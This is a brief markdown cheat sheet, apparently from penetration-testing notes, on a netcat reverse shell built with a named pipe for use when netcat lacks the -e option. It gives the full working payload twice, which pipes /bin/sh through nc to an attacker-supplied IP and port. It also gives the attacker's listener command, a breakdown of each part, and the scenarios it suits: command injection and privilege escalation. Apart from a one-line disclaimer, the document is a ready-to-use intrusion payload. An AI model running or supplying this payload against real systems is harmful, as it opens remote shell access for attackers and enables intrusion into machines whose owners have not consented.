# 🧨 Netcat Reverse Shell using Named Pipe (FIFO)

## 📌 Overview

This reverse shell is used when netcat does not support the `-e` option.

---

## 🔧 Payload

```bash
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc <IP> <PORT> > /tmp/f
```

---

## 🧠 How It Works

* `rm /tmp/f` → remove old pipe
* `mkfifo /tmp/f` → create named pipe
* `cat /tmp/f | /bin/sh -i` → send commands to shell
* `2>&1` → redirect errors
* `nc IP PORT` → connect to attacker
* `> /tmp/f` → send output back

👉 This creates a loop for interactive shell

---

## 🎯 When to Use

* Netcat available but `-e` disabled
* Command injection scenario
* Limited environment

---

## 🛠 Attacker Setup

```bash
nc -lvnp <PORT>
```

---

## ⚡ Better Version (Recommended)

```bash
rm /tmp/f && mkfifo /tmp/f && cat /tmp/f | /bin/sh -i 2>&1 | nc <IP> <PORT> > /tmp/f
```

👉 Uses `&&` to ensure proper execution

---

## 🧪 Real Use Case

Used during privilege escalation when a root script executed a writable shell file.
This payload provided a stable reverse connection.

---

## ⚠️ Disclaimer

For educational and authorized penetration testing only.
